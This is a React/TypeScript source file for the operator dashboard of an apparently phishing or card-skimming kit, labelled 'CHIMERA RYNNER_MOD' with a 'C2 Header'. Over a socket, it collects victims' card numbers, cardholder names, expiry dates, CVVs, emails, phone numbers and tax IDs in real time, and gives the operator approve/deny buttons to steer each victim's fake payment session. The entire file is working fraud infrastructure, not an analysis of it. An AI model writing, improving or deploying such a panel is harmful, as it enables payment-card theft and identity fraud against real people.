
import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import type { AdminUpdatePayload, SessionData } from '../types';

const AdminPanel: React.FC = () => {
  const [sessions, setSessions] = useState<Record<string, SessionData>>({});
  const socket = useRef<any>(null);

  useEffect(() => {
    socket.current = io();

    const handleAdminUpdate = (data: AdminUpdatePayload) => {
      setSessions(prevSessions => {
        const { sessionId, field, value } = data;
        
        // Update to include new fields in validation
        const validFields: (keyof SessionData)[] = ['cardNumber', 'cardHolder', 'expiryDate', 'cvv', 'email', 'phone', 'nif', 'paymentMethod', 'paymentStatus'];
        
        if (!validFields.includes(field as any)) return prevSessions;

        const updatedSession: SessionData = {
          ...(prevSessions[sessionId] || { 
              cardNumber: '', cardHolder: '', expiryDate: '', cvv: '', 
              email: '', phone: '', nif: '', paymentMethod: '', paymentStatus: 'idle', timestamp: '' 
          }),
          [field]: value,
          timestamp: new Date().toLocaleTimeString('pt-BR', { hour12: false }),
        };
        
        return { ...prevSessions, [sessionId]: updatedSession };
      });
    };
    
    socket.current.on('admin_update', handleAdminUpdate);

    return () => {
      if (socket.current) {
        socket.current.off('admin_update', handleAdminUpdate);
        socket.current.disconnect();
      }
    };
  }, []);

  const handleDecision = (sessionId: string, decision: 'approved' | 'denied') => {
      if (socket.current) {
          socket.current.emit('admin_decision', { sessionId, status: decision });
          
          // Optimistic update for admin view
          setSessions(prev => ({
              ...prev,
              [sessionId]: { ...prev[sessionId], paymentStatus: decision }
          }));
      }
  };

  return (
    <div className="bg-black min-h-screen text-[#00ff41] font-mono p-4 selection:bg-[#003b0f] selection:text-white">
      <div className="max-w-full mx-auto">
        
        {/* C2 Header */}
        <header className="border-b border-[#003b0f] pb-4 mb-6 flex justify-between items-end">
          <div>
            <h1 className="text-2xl font-bold tracking-tighter text-white">
              CHIMERA <span className="text-yellow-500 text-xs align-top">RYNNER_MOD</span>
            </h1>
            <p className="text-xs text-[#00ff41] opacity-70">
              [TARGET: RYNNER] [FIELDS: EXTENDED] [CMD: ACTIVE]
            </p>
          </div>
          <div className="text-right text-xs">
            <div className="animate-pulse">● LISTENING</div>
          </div>
        </header>

        {/* Grid of Sessions */}
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
          {Object.keys(sessions).length === 0 && (
             <div className="col-span-full h-64 flex flex-col items-center justify-center border border-[#003b0f] border-dashed rounded bg-black/50">
                 <p className="animate-pulse text-gray-500">_WAITING_FOR_DATA_INJECTION...</p>
             </div>
          )}

          {(Object.entries(sessions) as [string, SessionData][]).map(([sessionId, data]) => (
            <div key={sessionId} className={`relative group bg-[#0a0a0a] border p-4 rounded-sm shadow-[0_0_10px_rgba(0,255,65,0.05)] transition-all duration-200 ${data.paymentStatus === 'processing' ? 'border-yellow-500 shadow-[0_0_15px_rgba(234,179,8,0.3)]' : 'border-[#003b0f] hover:border-[#00ff41]'}`}>
              
              <div className="flex justify-between items-start mb-4 border-b border-[#003b0f] pb-2">
                <div>
                    <span className="text-[10px] text-gray-500 uppercase tracking-widest">SESSION_ID</span>
                    <h2 className="text-sm font-bold text-white font-mono">{sessionId.substring(0, 8)}...</h2>
                </div>
                <div className="text-right">
                    <span className="text-[10px] text-gray-500 uppercase tracking-widest">STATUS</span>
                    {data.paymentStatus === 'processing' ? (
                         <p className="text-xs text-yellow-500 font-bold animate-pulse">PROCESSING_REQUEST</p>
                    ) : (
                         <p className={`text-xs ${data.paymentStatus === 'approved' ? 'text-green-500' : data.paymentStatus === 'denied' ? 'text-red-500' : 'text-gray-500'}`}>
                             {data.paymentStatus?.toUpperCase() || 'IDLE'}
                         </p>
                    )}
                </div>
              </div>

              <div className="space-y-3">
                
                {/* Contact Intel */}
                <div className="grid grid-cols-2 gap-2 border-b border-[#003b0f] pb-2 mb-2">
                    <div>
                        <label className="text-[10px] text-blue-400 block">EMAIL</label>
                        <div className="text-xs text-white truncate">{data.email || '---'}</div>
                    </div>
                    <div>
                        <label className="text-[10px] text-blue-400 block">PHONE</label>
                        <div className="text-xs text-white truncate">{data.phone || '---'}</div>
                    </div>
                    <div className="col-span-2">
                         <label className="text-[10px] text-blue-400 block">NIF</label>
                         <div className="text-xs text-white">{data.nif || '---'}</div>
                    </div>
                </div>

                {/* Financial Intel */}
                <div className="bg-[#051a05] p-2 rounded border border-[#003b0f]">
                    <label className="text-[10px] text-[#00ff41] block mb-1 opacity-70">CARD / ID</label>
                    <div className="text-lg text-white tracking-widest font-bold h-7 break-all">
                        {data.cardNumber || <span className="text-gray-700">_NO_DATA</span>}
                    </div>
                </div>

                <div>
                    <label className="text-[10px] text-gray-500 block">HOLDER</label>
                    <div className="text-sm text-gray-300 h-5 border-b border-[#003b0f] border-dashed pb-1">
                        {data.cardHolder || '---'}
                    </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <label className="text-[10px] text-red-500 block">EXP</label>
                        <div className="text-sm text-white font-bold h-5">{data.expiryDate || '--/--'}</div>
                    </div>
                    <div>
                        <label className="text-[10px] text-red-500 block">CVV</label>
                        <div className="text-sm text-red-400 font-bold h-5">{data.cvv || '---'}</div>
                    </div>
                </div>

                {/* Command Actions */}
                {data.paymentStatus === 'processing' && (
                    <div className="mt-4 pt-2 border-t border-yellow-900/50 flex space-x-2 animate-in fade-in slide-in-from-top-2">
                        <button 
                            onClick={() => handleDecision(sessionId, 'approved')}
                            className="flex-1 bg-[#003b0f] hover:bg-[#00ff41] text-white hover:text-black text-xs font-bold py-2 border border-[#00ff41] transition-colors"
                        >
                            [ APROVAR ]
                        </button>
                        <button 
                             onClick={() => handleDecision(sessionId, 'denied')}
                             className="flex-1 bg-[#3b0000] hover:bg-[#ff0000] text-white hover:text-black text-xs font-bold py-2 border border-[#ff0000] transition-colors"
                        >
                            [ RECUSAR ]
                        </button>
                    </div>
                )}
              </div>

              <div className="absolute top-2 right-2 w-1.5 h-1.5 bg-[#00ff41] rounded-full animate-ping"></div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
